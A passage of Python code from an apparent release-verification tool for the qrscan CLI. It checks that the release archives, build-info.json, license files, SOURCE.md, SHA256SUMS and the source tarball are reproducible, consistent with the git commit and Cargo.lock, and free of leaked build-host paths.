            end = info.header_offset + 30 + name_size + extra_size + info.compress_size
            if not info.is_dir() and not info.flag_bits & 0x1 and \
                    info.compress_type in (zipfile.ZIP_STORED, zipfile.ZIP_DEFLATED):
                files[info.filename] = archive.read(info)
        if archive.start_dir != end:
            problems.append(f"{archive.start_dir - end:+d} byte(s) between the last entry and the central directory")
    if raw[-22:-18] != b"PK\x05\x06":
        problems.append("data after the end-of-central-directory record")
    return infos, files, problems


def cli_headers(entries: list, zipped: bool, stem: str, binary: str, epoch) -> tuple:
    """(owner and time problems, mode problems) of a CLI archive's entries: uid/gid 0 and no user or group
    name (tar) or create_system 3 (zip), times from EPOCH, modes by policy rather than from any filesystem."""
    owner, modes = [], []
    for entry in entries:
        name = entry.orig_filename if zipped else entry.name + ("/" if entry.isdir() else "")
        directory = name.endswith("/")
        want = 0o755 if directory or name == f"{stem}/{binary}" else 0o644
        if zipped:
            want |= 0o040000 if directory else 0o100000
            if entry.create_system != 3:
                owner.append(f"{name}: create_system {entry.create_system}")
            if type(epoch) is not int or entry.date_time != dos_time(epoch):
                owner.append(f"{name}: time {entry.date_time}")
            mode = entry.external_attr >> 16
        else:
            if (entry.uid, entry.gid) != (0, 0):
                owner.append(f"{name}: uid/gid {entry.uid}/{entry.gid}")
            if entry.uname or entry.gname:
                owner.append(f"{name}: uname {entry.uname!r}, gname {entry.gname!r}")
            if entry.mtime != epoch:
                owner.append(f"{name}: mtime {entry.mtime}")
            mode = entry.mode
        if mode != want:
            modes.append(f"{name}: mode {mode:o}, want {want:o}")
    return owner, modes


def check_cli_build_info(host: Host, art: Artifact, data, triple: str, binary: str, program) -> dict:
    """build-info.json against the archive, the options and the checkout; returns it ({} when unreadable)."""
    try:
        info = json.loads(data)
    except (TypeError, ValueError) as err:
        art.check("build-info.json reads as a JSON object", False, "absent" if data is None else str(err))
        return {}
    if not art.check("build-info.json reads as a JSON object", isinstance(info, dict), type(info).__name__):
        return {}
    shape = [] if info.get("schema") == CLI_BUILD_INFO else [f"schema {info.get('schema')!r}"]
    for where, want in BUILD_INFO_KEYS.items():
        value = info.get(where) if where else info
        if not isinstance(value, dict):
            shape.append(f"{where} is not an object")
            continue
        shape += [f"unexpected key {where}{'.' if where else ''}{key}" for key in sorted(set(value) - want)]
        shape += [f"missing key {where}{'.' if where else ''}{key}" for key in sorted(want - set(value))]
    if not {"kind", "unwinder"} <= set(obj(info.get("linker"))):
        shape.append("linker is no object with kind and unwinder")
    for label in ("dependencies", "build_dependencies"):
        entries = info.get(label)
        shape += [f"{label} is not a list"] if not isinstance(entries, list) else [
            f"{label}[{i}] keys {sorted(entry) if isinstance(entry, dict) else type(entry).__name__}"
            for i, entry in enumerate(entries) if not isinstance(entry, dict) or set(entry) != DEPENDENCY_KEYS]
    for label in ("rustflags", "command", "toolchain.rustc"):
        value = obj(info.get("toolchain")).get("rustc") if label == "toolchain.rustc" else info.get(label)
        if not isinstance(value, list) or not value or not all(isinstance(item, str) for item in value):
            shape.append(f"{label} is no list of strings")
    art.check(f"build-info.json: schema {CLI_BUILD_INFO}, exactly its keys", not shape, "; ".join(shape))
    named = {"name": "qrscan", "package": CLI_PACKAGE, "version": host.version, "target": triple}
    off = [f"{key} {info.get(key)!r}, want {value!r}" for key, value in named.items() if info.get(key) != value]
    art.check("build-info names this archive: qrscan, its package, version and target", not off, "; ".join(off))
    source = obj(info.get("source"))
    art.check("build-info source.commit = --commit", source.get("commit") == host.args.commit,
              f"source.commit {source.get('commit')!r}")
    tag = source.get("tag")
    if host.args.tag:
        release_tag = host.args.tag.removeprefix("refs/tags/")
        art.check(f"build-info source.tag = --tag {release_tag}", tag == release_tag, f"source.tag {tag!r}")
    if tag is not None:
        art.check("a tagged build's tag names the workspace version and its ref",
                  tag == f"v{host.version}" and source.get("ref") == f"refs/tags/{tag}",
                  f"tag {tag!r}, ref {source.get('ref')!r}")
    lock = sha256((ROOT / "Cargo.lock").read_bytes())
    epoch = source.get("source_date_epoch")
    origin = [f"{why}: {source.get(key)!r}" for key, bad, why in (
        ("repository", source.get("repository") != workspace_repository(), "repository"),
        ("cargo_lock_sha256", source.get("cargo_lock_sha256") != lock,
         f"Cargo.lock sha256 ≠ checkout {lock[:16]}…"),
        ("dirty", source.get("dirty") is not False, "dirty"),
        ("source_date_epoch", type(epoch) is not int or epoch < 0, "source_date_epoch")) if bad]
    art.check("build-info source: this repository, the checkout's Cargo.lock sha256, a clean tree, an integer "
              "source_date_epoch", not origin, "; ".join(origin))
    toolchain = obj(info.get("toolchain"))
    rustc = toolchain.get("rustc") if isinstance(toolchain.get("rustc"), list) else []
    releases = [line.split(":", 1)[1].strip() for line in rustc
                if isinstance(line, str) and line.startswith("release:")]
    pin = rust_pin()
    art.check(f"build-info rustc release = RUST_TOOLCHAIN {pin}", pin is not None and releases == [pin],
              f"rustc -vV release lines {releases}")
    record = obj(info.get("binary"))
    want = {"path": binary, "sha256": sha256(program or b""), "size": len(program or b"")}
    off = [f"{key} {record.get(key)!r}" for key, value in want.items() if record.get(key) != value]
    art.check(f"build-info binary = the {binary} member (path, sha256, size)", program is not None and not off,
              "; ".join(off) or ("" if program is not None else f"no {binary} member"))
    profile = cli_profile()
    art.check("build-info profile = the root manifest's release profile", info.get("profile") == profile,
              "" if info.get("profile") == profile else f"{info.get('profile')!r}, want {profile!r}")
    given = info.get("rustflags") if isinstance(info.get("rustflags"), list) else []
    flags = [flag for flag in given if isinstance(flag, str)]
    remaps = [re.fullmatch(r"--remap-path-prefix=(<[a-z-]+>)=[^\s<>]*", flag) for flag in flags[:len(CLI_PLACEHOLDERS)]]
    art.check("build-info rustflags: one placeholder remap each for <cargo-home>, <checkout> and <target-dir>, then "
              "the row's own flags", len(flags) == len(given)
              and sorted(m.group(1) if m else "?" for m in remaps) == sorted(CLI_PLACEHOLDERS)
              and flags[len(CLI_PLACEHOLDERS):] == CLI_ROW_FLAGS.get(triple, []), f"{info.get('rustflags')!r}")
    if triple.endswith("-linux-gnu"):
        unwinder = obj(info.get("linker")).get("unwinder")
        art.check(f"build-info linker names the GNU row's unwinder ({' or '.join(CLI_UNWINDERS)})",
                  unwinder in CLI_UNWINDERS, f"unwinder {unwinder!r}")
    target = CLI_DEPLOYMENT_TARGETS.get(triple)
    art.check(f"build-info deployment_target = {json.dumps(target)}", info.get("deployment_target") == target,
              json.dumps(info.get("deployment_target")))
    check_cli_inventory(art, info)
    return info


def check_cli_inventory(art: Artifact, info: dict) -> None:
    """Each linked and build-only dependency is its Cargo.lock entry (source, checksum), once, with a license."""
    problems, seen = [], set()
    for label in ("dependencies", "build_dependencies"):
        for dep in info.get(label) if isinstance(info.get(label), list) else []:
            dep = obj(dep)
            key = (dep.get("name"), dep.get("version"))
            label_key = f"{label}: {key[0]} {key[1]}"
            if not all(isinstance(part, str) for part in key):
                problems.append(f"{label_key}: a name or version that is no string")
                continue
            if key in seen:
                problems.append(f"{label_key} listed twice")
                continue
            seen.add(key)
            lock = lock_packages().get(key)
            if lock is None:
                problems.append(f"{label_key} is not in Cargo.lock")
                continue
            problems += [f"{label_key} {field} {dep.get(field)!r}, Cargo.lock {lock.get(field)!r}"
                         for field in ("source", "checksum") if dep.get(field) != lock.get(field)]
            if not isinstance(dep.get("license"), str) or not dep["license"].strip():
                problems.append(f"{label_key} has no license expression")
    art.check("build-info dependencies: each is its Cargo.lock entry (source, checksum), once, with a license",
              not problems, "; ".join(problems))
    deps = info.get("dependencies") if isinstance(info.get("dependencies"), list) else []
    linked = {name for name in (obj(dep).get("name") for dep in deps) if isinstance(name, str)}
    missing = [name for name in CLI_ANCHORS if name not in linked]
    art.check(f"build-info links the anchors {', '.join(CLI_ANCHORS)}", not missing, f"missing: {', '.join(missing)}"
              if missing else "")


def check_cli_source_md(host: Host, art: Artifact, data, info: dict) -> None:
    """SOURCE.md holds each fact line exactly once, with the value this inspection knows."""
    source, builder, repository = obj(info.get("source")), obj(info.get("builder")), workspace_repository()
    tag = host.args.tag.removeprefix("refs/tags/") if host.args.tag else source.get("tag")
    run, version = builder.get("workflow_run"), host.version
    facts = {
        "Repository": repository,
        "Tag": tag if tag else f"not a release tag ({source.get('ref')})",
        "Commit": host.args.commit,
        "Tree": f"{repository}/tree/{host.args.commit}",
        "Cargo.lock sha256": sha256((ROOT / "Cargo.lock").read_bytes()),
        "Workflow run": run if run else "none (built outside GitHub Actions)",
        "Corresponding source": f"{CLI_PACKAGE}-{version}-source.tar.gz (its sha256 is in "
                                f"{CLI_PACKAGE}-{version}-SHA256SUMS)",
    }
    try:
        text = (data or b"").decode("utf-8")
    except UnicodeDecodeError as err:
        art.check("SOURCE.md is UTF-8 with LF line ends and a final newline", False, str(err))
        return
    art.check("SOURCE.md is UTF-8 with LF line ends and a final newline",
              data is not None and "\r" not in text and text.endswith("\n"), "" if data is not None else "absent")
    lines, problems = text.split("\n"), []
    for key, value in facts.items():
        found = [line for line in lines if line.startswith(f"- {key}:")]
        if found != [f"- {key}: {value}"]:
            problems.append(f"{key}: {found or 'no line'}, want {f'- {key}: {value}'!r}")
    art.check("SOURCE.md states the repository, tag, commit, tree, Cargo.lock sha256, workflow run and source "
              "archive", not problems, "; ".join(problems))


def parse_third_party(data: bytes) -> tuple:
    """THIRD-PARTY-LICENSES.txt → (header line, [crate blocks], {sha256: text}, the first format problem or '').
    A header line, an empty line, then per crate `== <name> <version> ==`, `license:`, `source:`,
    `checksum:`, `texts: <sha256>…` and an empty line; then each text once: `--- text <sha256> <size>
    bytes ---`, its exact bytes and a newline, up to the end of the file."""
    header, crates, texts, pos = None, [], {}, 0

    def line() -> str:
        nonlocal pos
        end = data.find(b"\n", pos)
        if end < 0:
            raise ValueError(f"no newline after byte {pos}")
        found, pos = data[pos:end].decode("utf-8"), end + 1
        return found

    try:
        header = line()
        if line():
            raise ValueError("no empty line after the header")
        while data.startswith(b"== ", pos):
            title = re.fullmatch(r"== (\S+) (\S+) ==", line())
            fields = [re.fullmatch(rf"{key}: ({pattern})", line()) for key, pattern in THIRD_PARTY_FIELDS]
            if not title or not all(fields) or line():
                raise ValueError(f"a malformed crate block ending at byte {pos}")
            crates.append({"name": title.group(1), "version": title.group(2),
                           **{key: found.group(1) for (key, _), found in zip(THIRD_PARTY_FIELDS, fields)}})
        while pos < len(data):
            head = THIRD_PARTY_TEXT.fullmatch(line())
            if not head:
                raise ValueError(f"no `--- text <sha256> <size> bytes ---` line ending at byte {pos}")
            size, digest = int(head.group("size")), head.group("sha256")
            body, pos = data[pos:pos + size], pos + size
            if len(body) != size or data[pos:pos + 1] != b"\n":
                raise ValueError(f"text {digest[:16]}… is cut short")
            pos += 1
            if digest in texts:
                raise ValueError(f"text {digest[:16]}… appears twice")
            texts[digest] = body
    except (ValueError, UnicodeDecodeError) as err:
        return header, crates, texts, str(err)
    return header, crates, texts, ""


def check_cli_licenses(host: Host, art: Artifact, data, info: dict, triple: str) -> None:
    """THIRD-PARTY-LICENSES.txt: build-info's linked registry crates, sorted, with the same facts and texts that
    hash to their names; every linked crate's expression satisfiable from deny.toml's allow list."""
    name = "THIRD-PARTY-LICENSES.txt"
    if data is None:
        art.check(f"{name} lists the linked crates and their license texts", False, "absent")
        return
    header, crates, texts, problem = parse_third_party(data)
    art.check(f"{name} reads as a header, crate blocks, then each text once", not problem, problem)
    want_header = f"Third-party crates in qrscan {host.version} for {triple}, and their license texts"
    art.check(f"{name} header names qrscan {host.version} for {triple}", header == want_header, f"{header!r}")
    linked = [obj(dep) for dep in info.get("dependencies")] if isinstance(info.get("dependencies"), list) else []
    registry = {(dep.get("name"), dep.get("version")): dep for dep in linked if dep.get("source") is not None
                and isinstance(dep.get("name"), str) and isinstance(dep.get("version"), str)}
    listed = [(crate["name"], crate["version"]) for crate in crates]
    order = [f"{a[0]} {a[1]} before {b[0]} {b[1]}" for a, b in zip(listed, listed[1:]) if a >= b]
    off = [f"not listed: {n} {v}" for n, v in sorted(set(registry) - set(listed), key=str)]
    off += [f"not a linked registry crate in build-info: {n} {v}" for n, v in sorted(set(listed) - set(registry))]
    art.check(f"{name} lists exactly build-info's linked registry crates, sorted by name and version, once each",
              not order and not off, "; ".join(order[:3] + off))
    facts, used = [], set()
    for crate in crates:
        dep, label = registry.get((crate["name"], crate["version"]), {}), f"{crate['name']} {crate['version']}"
        facts += [f"{label} {field} {crate[field]!r}, build-info {dep.get(field)!r}"
                  for field in ("license", "source", "checksum") if dep and crate[field] != dep.get(field)]
        digests = crate["texts"].split()
        used |= set(digests)
        facts += [f"{label} names text {digest[:16]}…, which the file does not hold"
                  for digest in digests if digest not in texts]
        if len(set(digests)) != len(digests):
            facts.append(f"{label} names a text twice")
    art.check(f"{name}: each crate's license, source and checksum as build-info records them, and its texts present",
              not facts, "; ".join(facts))
    keys = list(texts)
    bad = [f"text {key[:16]}… hashes to {sha256(body)[:16]}…" for key, body in texts.items() if sha256(body) != key]
    bad += [f"text {key[:16]}… is named by no crate" for key in keys if key not in used]
    bad += ["texts not sorted by sha256"] if keys != sorted(keys) else []
    art.check(f"{name}: each text once, sorted, named by its sha256 and by some crate", not bad, "; ".join(bad))
    allowed, refused = deny_allowed(), []
    for dep in linked:
        expression = dep.get("license")
        try:
            if not isinstance(expression, str) or not spdx_allowed(expression, allowed):
                refused.append(f"{dep.get('name')} {dep.get('version')}: {expression!r}")
        except ValueError as err:
            refused.append(f"{dep.get('name')} {dep.get('version')}: {err}")
    art.check("every linked crate's license expression is satisfiable from deny.toml's allow list",
              not refused, "; ".join(refused))


def cli_markers(host: Host) -> list:
    """(marker, why) no text member of a CLI archive may hold: the generic build-host prefixes; this host's
    HOME, USERPROFILE, RUNNER_TEMP, checkout and --source-tree paths in both slash forms; each --forbid
    value, named by its position so a private marker never reaches the report."""
    markers = [(leak, repr(leak)) for leak in CLI_LEAKS]
    places = [(os.environ.get(key), key) for key in ("HOME", "USERPROFILE", "RUNNER_TEMP")]
    places.append((str(ROOT), "the checkout path"))
    if host.args.source_tree:
        places.append((str(pathlib.Path(host.args.source_tree).resolve()), "the --source-tree path"))
    for value, why in places:
        # A short path (`/`, `/root`) would match any text: the generic list covers those hosts.
        if value and len(pathlib.PurePosixPath(value.replace("\\", "/")).parts) >= 3:
            markers += [(form, why) for form in sorted({value.replace("\\", "/"), value.replace("/", "\\")})]
    markers += [(value, f"--forbid value {i}") for i, value in enumerate(host.args.forbid or [], 1)]
    return markers


def check_cli_leaks(host: Host, art: Artifact, inner: dict, binary: str) -> None:
    """C9: no member name is a stray file, and no text member names a build host or a --forbid marker
    (ASCII case ignored: Windows and macOS paths are case-insensitive)."""
    check_stray(art, inner)
    markers = [(marker.encode("utf-8").lower(), why) for marker, why in cli_markers(host)]
    hits = []
    for name, data in sorted(inner.items()):
        if name != binary:
            lowered = data.lower()
            hits += sorted({f"{name}: {why}" for marker, why in markers if marker in lowered})
    art.check("no text member holds a build-host path or a --forbid marker", not hits, "; ".join(hits))


def check_cli_copy(art: Artifact, name: str, data, source: pathlib.Path) -> None:
    """NAME is SOURCE's bytes; an absent member or an absent source fails with its own reason."""
    want = source.read_bytes() if source.is_file() else None
    same = want is not None and data == want
    art.check(f"{name} is {rel(source)} verbatim", same, "" if same else (
        f"{rel(source)} is absent from the checkout" if want is None else
        "absent" if data is None else f"differs from {rel(source)}"))


def inspect_cli(host: Host, path: pathlib.Path, notes=()) -> Artifact:
    """One prebuilt qrscan archive: its name, container, members, headers, copies and generated files."""
    art = host.add(Artifact(f"CLI archive {path.name}", "cli"))
    art.notes.extend(notes)
    describe(art, path, [])
    named = CLI_ARCHIVE.fullmatch(path.name)
    version, triple, ext = named.group("version", "triple", "ext") if named else (None, None, None)
    art.package = {"filename": path.name, "version": version, "triple": triple}
    check_cli_name(art, path.name)
    art.check(f"name is {CLI_PACKAGE}-<version>-<triple>.tar.gz or .zip", named is not None, path.name)
    if named is None:
        return art
    art.check(f"version {version} = workspace {host.version}", version == host.version, f"{version!r}")
    if not art.check(f"target is one of {', '.join(CLI_TARGETS)}", triple in CLI_TARGETS, f"{triple!r}"):
        return art
    art.check("zip for the Windows target, tar.gz for the others", ext == CLI_TARGETS[triple], f".{ext}")
    stem, zipped = path.name[:-len(ext) - 1], ext == "zip"
    binary = "qrscan.exe" if triple.endswith("-windows-msvc") else "qrscan"
    try:
        if zipped:
            entries, files, problems = read_cli_zip(path)
            names = [entry.orig_filename for entry in entries]
        else:
            entries, files, tar, problems, global_headers = read_cli_tar(path)
            names = [m.name + ("/" if m.isdir() else "") for m in entries]
    except (OSError, EOFError, ValueError, zlib.error, tarfile.TarError, zipfile.BadZipFile) as err:
        art.check(f"reads as one .{ext} archive", False, f"{type(err).__name__}: {err}")
        return art
    art.listing = sorted(names)
    if zipped:
        art.check("one clean zip: stored or deflated entries in one stream, no duplicate, absolute, `..`, "
                  "backslash or symlink entry, no encryption, data descriptor, extra field or comment",
                  not problems, "; ".join(problems))
    else:
        special = [f"{m.name} ({_TAR_KINDS.get(m.type, f'type {m.type!r}')})" for m in entries
                   if not m.isfile() and not m.isdir()]
        check_members(art, special + _tar_anomalies(path, entries, raw=tar))
        problems += ustar_problems(tar, entries, global_headers)
        art.check("gzip and tar headers as the one writer makes them: no gzip FNAME or other flag, gzip mtime 0, "
                  "OS byte 255, one gzip member; POSIX ustar members only, no pax or GNU header",
                  not problems, "; ".join(problems))
    outside = [name for name in names if not name.startswith(f"{stem}/")]
    art.check(f"one top directory, {stem}/", not outside, ", ".join(outside[:5]))
    check_exact_set(art, names, frozenset({f"{stem}/", *(f"{stem}/{name}" for name in
                                                         [*CLI_COPIES, *CLI_GENERATED, binary])}),
                    "release archive's members")
    raw_names = [name.encode("utf-8", "surrogateescape") for name in names]
    unsorted = [f"{a} before {b}" for a, b, x, y in zip(names, names[1:], raw_names, raw_names[1:]) if x > y]
    art.check("members in bytewise order, the directory first", not unsorted, "; ".join(unsorted[:3]))
    inner = {name[len(stem) + 1:]: data for name, data in files.items() if name.startswith(f"{stem}/")}
    check_license(art, inner.get("LICENSE"), "LICENSE")
    for member, source in CLI_COPIES.items():
        if member != "LICENSE":
            check_cli_copy(art, member, inner.get(member), ROOT / source)
    check_readme(art, inner.get("README.md"), ("cli", CLI_PACKAGE))
    info = check_cli_build_info(host, art, inner.get("build-info.json"), triple, binary, inner.get(binary))
    source, toolchain = obj(info.get("source")), obj(info.get("toolchain"))
    owner, modes = cli_headers(entries, zipped, stem, binary, source.get("source_date_epoch"))
    art.check("zip entries made on Unix (create_system 3), each time = build-info's source_date_epoch" if zipped
              else "members owned by uid/gid 0 with no user or group name, mtime = build-info's source_date_epoch",
              not owner, "; ".join(owner[:6]))
    art.check(f"modes by policy: 0755 for the directory and {binary}, 0644 for the rest", not modes,
              "; ".join(modes[:6]))
    notice = inner.get("COPYRIGHT-rust-std.html")
    art.check("COPYRIGHT-rust-std.html sha256 = build-info toolchain.std_notice_sha256",
              notice is not None and sha256(notice) == toolchain.get("std_notice_sha256"),
              "absent" if notice is None else f"{sha256(notice)[:16]}…, build-info "
                                               f"{str(toolchain.get('std_notice_sha256'))[:16]}…")
    check_cli_source_md(host, art, inner.get("SOURCE.md"), info)
    check_cli_licenses(host, art, inner.get("THIRD-PARTY-LICENSES.txt"), info, triple)
    check_cli_leaks(host, art, inner, binary)
    rustc = toolchain.get("rustc") if isinstance(toolchain.get("rustc"), list) else []
    art.package.update(commit=source.get("commit"), cargo_lock_sha256=source.get("cargo_lock_sha256"),
                       rustc_release=[line for line in rustc if isinstance(line, str) and line.startswith("release:")],
                       std_notice_sha256=toolchain.get("std_notice_sha256"))
    return art


def inspect_cli_sums(host: Host, path: pathlib.Path, notes=()) -> Artifact:
    """The SHA256SUMS file: its name, its exact format and --sums-sha256. What it lists is judged once every
    file given is read (check_cli_sums)."""
    art = host.add(Artifact(f"CLI checksums {path.name}", "cli-sums"))
    art.notes.extend(notes)
    describe(art, path, [])
    named = CLI_SUMS.fullmatch(path.name)
    want = f"{CLI_PACKAGE}-{host.version}-SHA256SUMS"
    check_cli_name(art, path.name)
    art.check(f"name is {want}", path.name == want, path.name)
    data, problems, entries = path.read_bytes(), [], []
    if not data.isascii():
        problems.append("a non-ASCII byte")
    if b"\r" in data:
        problems.append("a CR byte (CRLF line ends)")
    if not data.endswith(b"\n"):
        problems.append("no final newline")
    lines = data.decode("ascii", "replace").split("\n")
    for number, line in enumerate(lines[:-1] if data.endswith(b"\n") else lines, 1):
        found = CLI_SUMS_LINE.fullmatch(line)
        if found:
            entries.append((found.group("name"), found.group("sha256")))
        else:
            problems.append(f"line {number} is not `<64 lowercase hex>  <file name>`: {line[:90]!r}")
    listed = [name for name, _ in entries]
    problems += [f"{a} before {b}" for a, b in zip(listed, listed[1:]) if a > b]
    problems += [f"{name} listed twice" for name in sorted({n for n in listed if listed.count(n) > 1})]
    problems += [] if lines != [""] else ["no line"]
    art.check("lines `<sha256>  <name>` (sha256sum's text format): ASCII, LF, a final newline, sorted by name, "
              "each name once", not problems, "; ".join(problems))
    art.listing = listed
    art.package = {"filename": path.name, "version": named.group("version") if named else None,
                   "entries": dict(entries)}
    if host.args.sums_sha256 is not None:
        same = art.sha256 == host.args.sums_sha256
        art.check("its sha256 = --sums-sha256", same, "" if same else
                  f"{art.sha256[:16]}…, --sums-sha256 {host.args.sums_sha256[:16]}…")
    return art


def check_cli_sums(host: Host) -> None:
    """S3: each SHA256SUMS lists every other CLI release file given, with its sha256, and nothing else."""
    given = {a.package.get("filename"): a.sha256 for a in host.artifacts if a.kind in ("cli", "cli-source")}
    for art in [a for a in host.artifacts if a.kind == "cli-sums"]:
        listed = art.package.get("entries") or {}
        problems = [f"no line for {name}" for name in sorted(set(given) - set(listed))]
        problems += [f"a line for {name}, which was not given" for name in sorted(set(listed) - set(given))]
        problems += [f"{name}: listed {listed[name][:16]}…, file {given[name][:16]}…"
                     for name in sorted(set(listed) & set(given)) if listed[name] != given[name]]
        art.check("one line per CLI archive and source archive given, with its sha256, and nothing else",
                  not problems, "; ".join(problems))


def check_cli_release_set(host: Host) -> None:
    """The release set is the five archives, the source archive and SHA256SUMS, once each, built from one
    commit, Cargo.lock, compiler and standard library notice, with nothing else beside them."""
    files = [a for a in host.artifacts if a.kind in CLI_KINDS]
    art = host.add(Artifact("CLI release set", "cli-set"))
    art.listing = sorted(a.package.get("filename") or a.name for a in files)
    archives, problems = [a for a in files if a.kind == "cli"], []
    for triple in CLI_TARGETS:
        count = sum(a.package.get("triple") == triple for a in archives)
        problems += [] if count == 1 else [f"{count} {triple} archives" if count else f"no {triple} archive"]
    problems += [f"{a.package.get('filename')} is no release target" for a in archives
                 if a.package.get("triple") not in CLI_TARGETS]
    for kind, what in (("cli-source", "source archive"), ("cli-sums", "SHA256SUMS")):
        count = sum(a.kind == kind for a in files)
        problems += [] if count == 1 else [f"{count} {what} files" if count else f"no {what}"]
    versions = sorted({str(a.package.get("version")) for a in files})
    problems += [] if versions == [host.version] else [f"versions {', '.join(versions)}, want {host.version} only"]
    for key, what in (("commit", "commits"), ("cargo_lock_sha256", "Cargo.lock sha256 values"),
                      ("rustc_release", "rustc releases"), ("std_notice_sha256", "std notices")):
        values = sorted({str(a.package.get(key)) for a in archives})
        problems += [] if len(values) <= 1 else [f"{len(values)} {what} across the archives: {', '.join(values)}"]
    problems += [f"{a.name} is not a CLI release asset" for a in host.artifacts if a.kind not in CLI_KINDS
                 and a is not art]
    art.check(f"the {len(CLI_TARGETS)} archives, the source archive and SHA256SUMS once each, from one version, "
              "commit, Cargo.lock, rustc and std notice, and nothing else", not problems, "; ".join(problems))


def parse_ls_tree(output: bytes) -> list:
    """`git ls-tree -r -t -z --full-tree` → [(mode, type, object id, path)]; paths decoded as tarfile does."""
    entries = []
    for record in filter(None, output.split(b"\0")):
        head, _, name = record.partition(b"\t")
        mode, kind, oid = head.decode("ascii").split(" ")
        entries.append((mode, kind, oid, name.decode("utf-8", "surrogateescape")))
    return entries


def parse_check_attr(output: bytes) -> dict:
    """`git check-attr -z` → {path: {attribute: value}}."""
    fields = output.split(b"\0")
    found: dict = {}
    for i in range(0, len(fields) - 2, 3):
        name, attribute, value = (field.decode("utf-8", "surrogateescape") for field in fields[i:i + 3])
        found.setdefault(name, {})[attribute] = value
    return found


def source_tree_problems(entries: list, attributes: dict) -> list:
    """Why a commit's tree cannot map one to one onto a source archive: a symlink or a submodule, or an entry
    git archive drops (export-ignore) or rewrites (export-subst)."""
    problems = [f"{name}: {'a symlink' if mode == '120000' else 'a submodule' if kind == 'commit' else f'mode {mode}'}"
                for mode, kind, _oid, name in entries
                if mode == "120000" or kind == "commit" or (kind == "blob" and mode not in ("100644", "100755"))]
    problems += [f"{name}: {attribute} {value}" for name, values in sorted(attributes.items())
                 for attribute, value in sorted(values.items()) if value not in ("unspecified", "unset")]
    return problems


_GIT_TREES: dict = {}


def git_tree(directory: pathlib.Path, commit: str, scratch: pathlib.Path) -> dict:
    """What git in DIRECTORY says about COMMIT: {head: HEAD^{commit}, entries: ls-tree rows, blobs: {id: bytes},
    attributes: export-ignore and export-subst of every path, error: why it could not, unavailable: no git}."""
    key = (str(directory.resolve()), commit)
    if key in _GIT_TREES:
        return _GIT_TREES[key]
    git = which("git")
    if git is None:
        return {"unavailable": "git is not installed"}

    def run(*args: str, stdin: bytes = None, env=None):
        return subprocess.run([git, "-C", str(directory), *args], input=stdin, capture_output=True, env=env)

    head = run("rev-parse", "--verify", "--quiet", "HEAD^{commit}")
    if head.returncode:
        return {"error": f"--source-tree has no HEAD commit (git rev-parse exit {head.returncode})"}
    listing = run("ls-tree", "-r", "-t", "-z", "--full-tree", commit)
    if listing.returncode:
        return {"head": head.stdout.decode().strip(),
                "error": f"git ls-tree {commit[:12]}: {listing.stderr.decode(errors='replace').strip()[:200]}"}
    result = {"head": head.stdout.decode().strip(), "entries": parse_ls_tree(listing.stdout)}
    wanted = [oid for _mode, kind, oid, _name in result["entries"] if kind == "blob"]
    batch = run("cat-file", "--batch", stdin="".join(f"{oid}\n" for oid in wanted).encode())
    blobs, pos, out = {}, 0, batch.stdout
    try:
        for oid in wanted:
            end = out.index(b"\n", pos)
            found, kind, size = out[pos:end].decode("ascii").split(" ")
            if (found, kind) != (oid, "blob"):
                raise ValueError(out[pos:end].decode("ascii", "replace"))
            blobs[oid], pos = out[end + 1:end + 1 + int(size)], end + 2 + int(size)
    except ValueError as err:
        return result | {"error": f"git cat-file --batch: no blob for {oid}: {err}"}
    paths = b"".join(name.encode("utf-8", "surrogateescape") + b"\0" for *_rest, name in result["entries"])
    names = ["export-ignore", "export-subst"]
    attrs = run("check-attr", "-z", "--stdin", "--source", commit, *names, stdin=paths)
    if attrs.returncode:  # git < 2.40 has no --source: ask COMMIT's own index, in a scratch file
        env = dict(os.environ, GIT_INDEX_FILE=str(scratch / "source-index"))
        loaded = run("read-tree", commit, env=env)
        attrs = run("check-attr", "-z", "--stdin", "--cached", *names, stdin=paths, env=env) \
            if loaded.returncode == 0 else loaded
    if attrs.returncode:
        return result | {"error": f"git check-attr: {attrs.stderr.decode(errors='replace').strip()[:200]}"}
    result.update(blobs=blobs, attributes=parse_check_attr(attrs.stdout), error="")
    _GIT_TREES[key] = result
    return result


def inspect_cli_source(host: Host, path: pathlib.Path, notes=()) -> Artifact:
    """The source archive: `git archive --prefix=<stem>/` of --commit, gzipped by the one writer. Its members
    map one to one onto the commit's tree, read from --source-tree. Its content is the public tree, so the
    leak scan of the archives does not apply."""
    art = host.add(Artifact(f"CLI source {path.name}", "cli-source"))
    art.notes.extend(notes)
    describe(art, path, [])
    named = CLI_SOURCE.fullmatch(path.name)
    art.package = {"filename": path.name, "version": named.group("version") if named else None}
    want = f"{CLI_PACKAGE}-{host.version}-source.tar.gz"
    check_cli_name(art, path.name)
    art.check(f"name is {want}", path.name == want, path.name)
    prefix = path.name.removesuffix(".tar.gz") + "/"
    try:
        tar, problems = gunzip(path.read_bytes())
        with tarfile.open(fileobj=io.BytesIO(tar)) as archive:
            members = archive.getmembers()
            files = {m.name: archive.extractfile(m).read() for m in members if m.isfile()}
            global_headers = dict(archive.pax_headers)
    except (OSError, EOFError, ValueError, zlib.error, tarfile.TarError) as err:
        art.check("reads as one gzip member holding a tar", False, f"{type(err).__name__}: {err}")
        return art
    names = [m.name + ("/" if m.isdir() else "") for m in members]
    art.listing = sorted(names)
    art.check("gzip header as the one writer makes it: no FNAME or other flag, mtime 0, OS byte 255, one member",
              not problems, "; ".join(problems))
    check_members(art, [f"{m.name} ({_TAR_KINDS.get(m.type, f'type {m.type!r}')})" for m in members
                        if not m.isfile() and not m.isdir()] + _tar_anomalies(path, members, raw=tar))
    comment = global_headers.get("comment")
    art.check("its pax global header is git archive's commit comment, = --commit",
              set(global_headers) == {"comment"} and comment == host.args.commit,
              f"pax global header {sorted(global_headers)}, comment {comment!r}")
    tree = git_tree(pathlib.Path(host.args.source_tree), host.args.commit, host.scratch)
    if "unavailable" in tree:
        return art.unavailable(tree["unavailable"])
    art.check("--source-tree's HEAD^{commit} = --commit", tree.get("head") == host.args.commit,
              f"HEAD^{{commit}} {tree.get('head')!r}")
    if not art.check("git reads the commit's tree, blobs and export attributes", not tree["error"], tree["error"]):
        return art
    problems = source_tree_problems(tree["entries"], tree["attributes"])
    art.check("the commit's tree has no symlink, submodule, export-ignore or export-subst entry", not problems,
              "; ".join(problems[:6]))
    rows = {prefix + name + ("/" if kind == "tree" else ""): (mode, oid) for mode, kind, oid, name in tree["entries"]}
    check_exact_set(art, names, frozenset({prefix, *rows}), f"commit's tree under {prefix}")
    modes = {m.name: m.mode for m in members if m.isfile()}
    altered = [name for name, data in sorted(files.items())
               if name in rows and data != tree["blobs"].get(rows[name][1])]
